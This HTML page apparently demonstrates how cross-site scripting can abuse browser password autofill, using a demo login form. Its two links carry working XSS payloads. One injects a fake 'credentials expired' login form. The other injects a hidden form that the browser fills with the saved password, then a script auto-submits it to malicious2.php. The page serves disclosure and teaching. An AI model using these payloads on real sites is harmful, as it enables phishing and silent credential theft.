<html>
	<head>
		<title>Login Page</title>
	</head>

	<body>
		<form action='xss.php' method='post'>
			Username <input type='text'     name='username' value='' /><br />
			Password <input type='password' name='password' value='' /><br />
			<input type='submit'   value='Log in' /><br />
		</form>

		Click <a href="http://www.javaop.com/~ron/code/firefox-passwords/xss.php?username=<br><br><b>Your credentials have expired, please re-enter them</b>:<p><form>Username: <input type='text' name='username'><br>Password: <input type='password' name='password'><br><input type='submit' value='submit'></form>">here</a> for a demonstration of a phishing-style XSS attack, after saving your password.
<p>
		Click <a href="http://www.javaop.com/~ron/code/firefox-passwords/xss.php?username=<div style='display: none;'><form id='evilform' action='malicious2.php' method='post'> Username <input type='text'     name='username' value='' /><br /> Password <input type='password' name='password' value='' /><br /> <input type='submit'   value='Log in' /><br /></div> </form> <script type='text/javascript'>function evil(){document.getElementById('evilform').submit();}window.setTimeout(evil,100);</script>">here</a> for a demonstration of an automatic XSS attack that automatically grabs the password (scary!)

		<hr>
		Note: all .php files here have a .phps variation, to view the source.  You can have a look at <a href='http://www.javaop.com/~ron/code/firefox-passwords/'>this folder</a> to see them all. 

	</body>
</html>




